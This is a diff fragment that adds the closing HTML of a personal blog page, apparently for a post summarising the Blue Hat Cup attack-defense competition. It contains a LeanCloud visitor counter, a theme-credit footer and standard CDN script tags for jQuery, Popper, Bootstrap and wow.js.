+
+<!-- id 将作为查询条件 -->
+<span id=/blog/%E8%93%9D%E5%B8%BD%E6%9D%AFawd%E6%80%BB%E7%BB%93 class="leancloud_visitors" data-flag-title="Your Article Title">
+  <em class="post-meta-item-text">阅读量 </em>
+  <i class="leancloud-visitors-count"></i>
+</span>
+
+</div>
+  </main>
+
+  <footer class="mt-auto py-3 text-center">
+
+  <small class="text-muted mb-2">
+    <i class="fas fa-code"></i> with <i class="fas fa-heart"></i>
+    by <strong>dyf</strong>
+  </small>
+
+  <div class="container-fluid justify-content-center">
+
+</div><small id="attribution">
+    theme <a href="https://github.com/YoussefRaafatNasry/portfolYOU">portfolYOU</a>
+  </small>
+  
+</footer>
+  <!-- GitHub Buttons -->
+<script async defer src="https://buttons.github.io/buttons.js"></script>
+
+<!-- jQuery CDN -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+<!-- Popper.js CDN -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"></script>
+
+<!-- Bootstrap JS CDN -->
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
+
+<!-- wow.js CDN & Activation -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/wow/1.1.2/wow.js"></script>
+<script> new WOW().init(); </script>
+
+<!-- Initialize all tooltips -->
+<script>
+$(function () {
+    $('[data-toggle="tooltip"]').tooltip()
+})
+</script>
+
+</body>
+
+</html>
